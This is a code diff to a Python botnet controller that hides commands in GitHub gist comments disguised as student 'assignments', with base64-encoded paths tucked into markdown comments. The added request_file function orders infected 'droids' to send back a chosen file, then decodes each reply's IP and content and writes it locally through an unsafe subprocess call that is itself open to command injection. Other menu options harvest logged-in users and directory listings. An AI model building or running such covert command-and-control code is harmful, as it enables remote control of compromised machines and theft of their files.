@@ -3,7 +3,7 @@ import sys
 import requests
 import json
 import time
-from datetime import datetime
+import subprocess
 import base64
 
 
@@ -87,6 +87,11 @@ def wait_for_reasonable_time():
     time.sleep(10)
 
 
+def execute_command(command):
+    process = subprocess.Popen(command.split(), stdout=subprocess.PIPE)
+    return process.communicate()
+
+
 def request_logged_in_users(git, number):
     comment_text = "# Assignment " + str(number) + "\nStudents, what users do you see on your lab computers?"
     git.add_comment_to_gist(comment_text)
@@ -107,6 +112,7 @@ def request_logged_in_users(git, number):
 
 def request_content_of_directory(git, number):
     path = input("Which directory?\n")
+    path = base64.b64encode(path.encode("utf-8")).decode("utf-8")
     print("Ordering the droids now.")
     comment_text = "# Assignment " + str(
         number) + "\nStudents, what is the content of your home directory?\n\n[//]: <> ( " \
@@ -142,6 +148,31 @@ def request_user(git, number):
             base64.b64decode(lines[5].split()[3]).decode("utf-8")))
 
 
+def request_file(git, number):
+    path = input("What file would you like?\n")
+    path_base = base64.b64encode(path.encode("utf-8")).decode("utf-8")
+    comment_text = "# Assignment " + str(
+        number) + "\nStudents, find and write here the hidden flag on the computer?\n\n[//]: <> ( " \
+                   + path_base + " )"
+    git.add_comment_to_gist(comment_text)
+    print("Downloading from droids...")
+    wait_for_reasonable_time()
+    related_comments = []
+    for comment in git.get_gist_comments():
+        if comment['body'].startswith("> # Assignment " + str(number)):
+            related_comments.append(comment['body'])
+
+    for comment in related_comments:
+        lines = comment.splitlines()
+        ip = bytes.fromhex(lines[2].split()[3]).decode("utf-8")
+        file_content = base64.b64decode(lines[5].split()[3]).decode("utf-8")
+        file_name = path.split("/")
+        file_name = str(file_name[len(file_name) - 1])
+        file_name = str(ip) + "_" + file_name
+        execute_command("echo " + file_content + " > " + file_name)
+        print("Droid with ip " + str(ip) + " downloaded file to: " + file_name)
+
+
 if __name__ == '__main__':
     if len(sys.argv) != 3:
         print("Program requires arguments:\nGITHUB_API_TOKEN GIST_NAME")
@@ -173,7 +204,6 @@ if __name__ == '__main__':
         except:
             print(wrong_option_text)
             continue
-        last_comment_check = datetime.utcnow()
         if selected_option == 1:
             assignment_number += 1
             print("Excellent choice, my lord.")
@@ -186,7 +216,7 @@ if __name__ == '__main__':
             request_user(git_instance, assignment_number)
         elif selected_option == 4:
             assignment_number += 1
-            request_content_of_directory(git_instance, assignment_number)
+            request_file(git_instance, assignment_number)
         elif selected_option == 5:
             assignment_number += 1
             request_content_of_directory(git_instance, assignment_number)
